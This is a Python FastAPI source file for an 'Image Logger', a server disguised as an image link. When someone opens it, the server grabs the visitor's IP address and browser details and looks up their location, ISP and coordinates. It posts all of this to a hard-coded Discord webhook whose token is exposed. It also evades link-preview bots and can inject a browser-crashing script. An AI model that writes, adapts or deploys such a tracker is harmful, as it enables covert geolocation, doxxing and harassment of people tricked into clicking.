from fastapi import FastAPI, Request, BackgroundTasks
from fastapi.responses import HTMLResponse, Response, RedirectResponse
import requests, base64, httpagentparser
from urllib.parse import unquote

app = FastAPI()

CONFIG = {
    "webhook": "https://discord.com/api/webhooks/1500432677508223037/0iZNJqzL1gUFkr5RdKvqrEMY4KSDpWvCv9QO5sOZGc1fmVx1cqZMVGb9hIjJB1o-qVzy",
    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200",
    "username": "Image Logger",
    "color": 0x00FFFF,
    "vpnCheck": 1, 
    "antiBot": 1,
    "crashBrowser": False,
    "buggedImage": True,
    "redirect": {"redirect": False, "page": "https://your-link.here"},
    "message": {"doMessage": False, "message": "This browser has been pwned.", "richMessage": True}
}

LOADING_IMAGE = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')

def send_to_webhook(ip, user_agent, path):
    if any(ip.startswith(b) for b in ("27", "104", "143", "164")): return
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    except: info = {}
    
    ping = "@everyone"
    if info.get("proxy"):
        if CONFIG["vpnCheck"] == 2: return
        if CONFIG["vpnCheck"] == 1: ping = ""
    if info.get("hosting"):
        if CONFIG["antiBot"] == 4:
            if not info.get("proxy"): return
        if CONFIG["antiBot"] == 3: return
        if CONFIG["antiBot"] in [1, 2]: ping = ""

    os, browser = httpagentparser.simple_detect(user_agent)
    description = f"**A User Opened the Original Image!**\n\n**Endpoint:** `{path}`\n\n**IP Info:**\n> **IP:** `{ip}`\n> **Provider:** `{info.get('isp', 'Unknown')}`\n> **ASN:** `{info.get('as', 'Unknown')}`\n> **Country:** `{info.get('country', 'Unknown')}`\n> **Region:** `{info.get('regionName', 'Unknown')}`\n> **City:** `{info.get('city', 'Unknown')}`\n> **Coords:** `{info.get('lat', '0')}, {info.get('lon', '0')}`\n> **Mobile:** `{info.get('mobile', 'False')}`\n> **VPN:** `{info.get('proxy', 'False')}`\n> **Bot:** `{info.get('hosting', 'False')}`\n\n**PC Info:**\n> **OS:** `{os}`\n> **Browser:** `{browser}`\n\n**User Agent:**\n```\n{user_agent}\n```"
    
    payload = {"username": CONFIG["username"], "content": ping, "embeds": [{"title": "Image Logger - IP Logged", "color": CONFIG["color"], "description": description}]}
    requests.post(CONFIG["webhook"], json=payload)

@app.get("/")
@app.get("/api/main")
async def logger(request: Request, background_tasks: BackgroundTasks, url: str = None):
    ip = request.headers.get("x-forwarded-for", request.client.host).split(',')[0]
    ua = request.headers.get("user-agent", "Unknown")
    background_tasks.add_task(send_to_webhook, ip, ua, str(request.url.path))
    
    if "discord" in ua.lower() or "bot" in ua.lower():
        return Response(content=LOADING_IMAGE, media_type="image/jpeg") if CONFIG["buggedImage"] else RedirectResponse(url=CONFIG["image"])

    if CONFIG["redirect"]["redirect"]: return RedirectResponse(url=CONFIG["redirect"]["page"])
    
    msg = CONFIG["message"]["message"]
    if CONFIG["message"]["doMessage"]:
        if CONFIG["crashBrowser"]: msg += '<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
        return HTMLResponse(content=msg)

    target = unquote(url) if url else CONFIG["image"]
    return HTMLResponse(content=f"<html><head><title>Image</title><style>body{{margin:0;background:#0e0e0e;display:flex;justify-content:center;align-items:center;height:100vh;}}img{{max-width:100%;max-height:100%;}}</style></head><body><img src='{target}'></body></html>")
